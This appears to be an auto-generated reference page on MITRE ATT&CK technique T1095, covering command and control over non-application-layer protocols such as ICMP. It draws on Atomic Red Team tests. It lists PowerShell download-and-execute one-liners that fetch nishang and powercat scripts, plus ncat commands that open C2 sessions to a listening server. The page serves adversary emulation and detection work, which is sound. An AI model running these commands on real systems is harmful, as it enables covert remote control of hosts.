
# Standard Non-Application Layer Protocol

## Description

### MITRE Description

> Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. (Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Windows', 'Linux', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1095

## Potential Commands

```
IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress 127.0.0.1

cmd /c #{ncat_exe} 127.0.0.1 #{server_port}

None
cmd /c $env:TEMP\T1095\nmap-7.80\ncat.exe #{server_ip} #{server_port}

cmd /c #{ncat_exe} #{server_ip} #{server_port}

IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c 127.0.0.1 -p #{server_port}

None
```

## Commands Dataset

```
[{'command': 'IEX (New-Object '
             "System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\n"
             'Invoke-PowerShellIcmp -IPAddress 127.0.0.1\n',
  'name': None,
  'source': 'atomics/T1095/T1095.yaml'},
 {'command': 'cmd /c #{ncat_exe} 127.0.0.1 #{server_port}\n',
  'name': None,
  'source': 'atomics/T1095/T1095.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1095/T1095.yaml'},
 {'command': 'cmd /c $env:TEMP\\T1095\\nmap-7.80\\ncat.exe #{server_ip} '
             '#{server_port}\n',
  'name': None,
  'source': 'atomics/T1095/T1095.yaml'},
 {'command': 'cmd /c #{ncat_exe} #{server_ip} #{server_port}\n',
  'name': None,
  'source': 'atomics/T1095/T1095.yaml'},
 {'command': 'IEX (New-Object '
             "System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\n"
             'powercat -c 127.0.0.1 -p #{server_port}\n',
  'name': None,
  'source': 'atomics/T1095/T1095.yaml'},
 {'command': None, 'name': None, 'source': 'atomics/T1095/T1095.yaml'}]
```

## Potential Detections

```json
[{'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Malware reverse engineering']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Malware reverse engineering']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Standard Non-Application Layer Protocol': {'atomic_tests': [{'auto_generated_guid': '0268e63c-e244-42db-bef7-72a9e59fc1fc',
                                                                                       'description': 'This '
                                                                                                      'will '
                                                                                                      'attempt '
                                                                                                      'to  '
                                                                                                      'start '
                                                                                                      'C2 '
                                                                                                      'Session '
                                                                                                      'Using '
                                                                                                      'ICMP. '
                                                                                                      'For '
                                                                                                      'information '
                                                                                                      'on '
                                                                                                      'how '
                                                                                                      'to '
                                                                                                      'set '
                                                                                                      'up '
                                                                                                      'the '
                                                                                                      'listener\n'
                                                                                                      'refer '
                                                                                                      'to '
                                                                                                      'the '
                                                                                                      'following '
                                                                                                      'blog: '
                                                                                                      'https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n',
                                                                                       'executor': {'command': 'IEX '
                                                                                                               '(New-Object '
                                                                                                               "System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\n"
                                                                                                               'Invoke-PowerShellIcmp '
                                                                                                               '-IPAddress '
                                                                                                               '#{server_ip}\n',
                                                                                                    'elevation_required': False,
                                                                                                    'name': 'powershell'},
                                                                                       'input_arguments': {'server_ip': {'default': '127.0.0.1',
                                                                                                                         'description': 'The '
                                                                                                                                        'IP '
                                                                                                                                        'address '
                                                                                                                                        'of '
                                                                                                                                        'the '
                                                                                                                                        'listening '
                                                                                                                                        'server',
                                                                                                                         'type': 'string'}},
                                                                                       'name': 'ICMP '
                                                                                               'C2',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': 'bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37',
                                                                                       'dependencies': [{'description': 'ncat.exe '
                                                                                                                        'must '
                                                                                                                        'be '
                                                                                                                        'available '
                                                                                                                        'at '
                                                                                                                        'specified '
                                                                                                                        'location '
                                                                                                                        '(#{ncat_exe})\n',
                                                                                                         'get_prereq_command': 'New-Item '
                                                                                                                               '-ItemType '
                                                                                                                               'Directory '
                                                                                                                               '-Force '
                                                                                                                               '-Path '
                                                                                                                               '#{ncat_path} '
                                                                                                                               '| '
                                                                                                                               'Out-Null\n'
                                                                                                                               '$parentpath '
                                                                                                                               '= '
                                                                                                                               'Split-Path '
                                                                                                                               '(Split-Path '
                                                                                                                               '"#{ncat_exe}"); '
                                                                                                                               '$zippath '
                                                                                                                               '= '
                                                                                                                               '"$parentpath\\nmap.zip"\n'
                                                                                                                               'Invoke-WebRequest  '
                                                                                                                               '"https://nmap.org/dist/nmap-7.80-win32.zip" '
                                                                                                                               '-OutFile '
                                                                                                                               '"$zippath"\n'
                                                                                                                               '  '
                                                                                                                               'Expand-Archive '
                                                                                                                               '$zippath '
                                                                                                                               '$parentpath '
                                                                                                                               '-Force\n'
                                                                                                                               '  '
                                                                                                                               '$unzipPath '
                                                                                                                               '= '
                                                                                                                               'Join-Path '
                                                                                                                               '$parentPath '
                                                                                                                               '"nmap-7.80"\n'
                                                                                                                               'if( '
                                                                                                                               '$null '
                                                                                                                               '-eq '
                                                                                                                               '(Get-ItemProperty '
                                                                                                                               'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* '
                                                                                                                               '| '
                                                                                                                               '?{$_.DisplayName '
                                                                                                                               '-like '
                                                                                                                               '"Microsoft '
                                                                                                                               'Visual '
                                                                                                                               'C++*"}) '
                                                                                                                               ') '
                                                                                                                               '{\n'
                                                                                                                               '  '
                                                                                                                               'Start-Process '
                                                                                                                               '(Join-Path '
                                                                                                                               '$unzipPath '
                                                                                                                               '"vcredist_x86.exe")\n'
                                                                                                                               '}\n',
                                                                                                         'prereq_command': 'if( '
                                                                                                                           'Test-Path '
                                                                                                                           '"#{ncat_exe}") '
                                                                                                                           '{exit '
                                                                                                                           '0} '
                                                                                                                           'else '
                                                                                                                           '{exit '
                                                                                                                           '1}\n'}],
                                                                                       'dependency_executor_name': 'powershell',
                                                                                       'description': 'Start '
                                                                                                      'C2 '
                                                                                                      'Session '
                                                                                                      'Using '
                                                                                                      'Ncat\n'
                                                                                                      'To '
                                                                                                      'start '
                                                                                                      'the '
                                                                                                      'listener '
                                                                                                      'on '
                                                                                                      'a '
                                                                                                      'Linux '
                                                                                                      'device, '
                                                                                                      'type '
                                                                                                      'the '
                                                                                                      'following: \n'
                                                                                                      'nc '
                                                                                                      '-l '
                                                                                                      '-p '
                                                                                                      '<port>\n',
                                                                                       'executor': {'command': 'cmd '
                                                                                                               '/c '
                                                                                                               '#{ncat_exe} '
                                                                                                               '#{server_ip} '
                                                                                                               '#{server_port}\n',
                                                                                                    'elevation_required': False,
                                                                                                    'name': 'powershell'},
                                                                                       'input_arguments': {'ncat_exe': {'default': '$env:TEMP\\T1095\\nmap-7.80\\ncat.exe',
                                                                                                                        'description': 'The '
                                                                                                                                       'location '
                                                                                                                                       'of '
                                                                                                                                       'ncat.exe',
                                                                                                                        'type': 'path'},
                                                                                                           'ncat_path': {'default': '$env:TEMP\\T1095',
                                                                                                                         'description': 'The '
                                                                                                                                        'folder '
                                                                                                                                        'path '
                                                                                                                                        'of '
                                                                                                                                        'ncat.exe',
                                                                                                                         'type': 'path'},
                                                                                                           'server_ip': {'default': '127.0.0.1',
                                                                                                                         'description': 'The '
                                                                                                                                        'IP '
                                                                                                                                        'address '
                                                                                                                                        'or '
                                                                                                                                        'domain '
                                                                                                                                        'name '
                                                                                                                                        'of '
                                                                                                                                        'the '
                                                                                                                                        'listening '
                                                                                                                                        'server',
                                                                                                                         'type': 'string'},
                                                                                                           'server_port': {'default': 80,
                                                                                                                           'description': 'The '
                                                                                                                                          'port '
                                                                                                                                          'for '
                                                                                                                                          'the '
                                                                                                                                          'C2 '
                                                                                                                                          'connection',
                                                                                                                           'type': 'integer'}},
                                                                                       'name': 'Netcat '
                                                                                               'C2',
                                                                                       'supported_platforms': ['windows']},
                                                                                      {'auto_generated_guid': '3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e',
                                                                                       'description': 'Start '
                                                                                                      'C2 '
                                                                                                      'Session '
                                                                                                      'Using '
                                                                                                      'Powercat\n'
                                                                                                      'To '
                                                                                                      'start '
                                                                                                      'the '
                                                                                                      'listener '
                                                                                                      'on '
                                                                                                      'a '
                                                                                                      'Linux '
                                                                                                      'device, '
                                                                                                      'type '
                                                                                                      'the '
                                                                                                      'following: \n'
                                                                                                      'nc '
                                                                                                      '-l '
                                                                                                      '-p '
                                                                                                      '<port>\n',
                                                                                       'executor': {'command': 'IEX '
                                                                                                               '(New-Object '
                                                                                                               "System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\n"
                                                                                                               'powercat '
                                                                                                               '-c '
                                                                                                               '#{server_ip} '
                                                                                                               '-p '
                                                                                                               '#{server_port}\n',
                                                                                                    'elevation_required': False,
                                                                                                    'name': 'powershell'},
                                                                                       'input_arguments': {'server_ip': {'default': '127.0.0.1',
                                                                                                                         'description': 'The '
                                                                                                                                        'IP '
                                                                                                                                        'address '
                                                                                                                                        'or '
                                                                                                                                        'domain '
                                                                                                                                        'name '
                                                                                                                                        'of '
                                                                                                                                        'the '
                                                                                                                                        'listening '
                                                                                                                                        'server',
                                                                                                                         'type': 'string'},
                                                                                                           'server_port': {'default': 80,
                                                                                                                           'description': 'The '
                                                                                                                                          'port '
                                                                                                                                          'for '
                                                                                                                                          'the '
                                                                                                                                          'C2 '
                                                                                                                                          'connection',
                                                                                                                           'type': 'integer'}},
                                                                                       'name': 'Powercat '
                                                                                               'C2',
                                                                                       'supported_platforms': ['windows']}],
                                                                     'attack_technique': 'T1095',
                                                                     'display_name': 'Standard '
                                                                                     'Non-Application '
                                                                                     'Layer '
                                                                                     'Protocol'}}]
```

# Tactics


* [Command and Control](../tactics/Command-and-Control.md)


# Mitigations

None

# Actors


* [PLATINUM](../actors/PLATINUM.md)

* [APT29](../actors/APT29.md)
    
* [APT3](../actors/APT3.md)
    
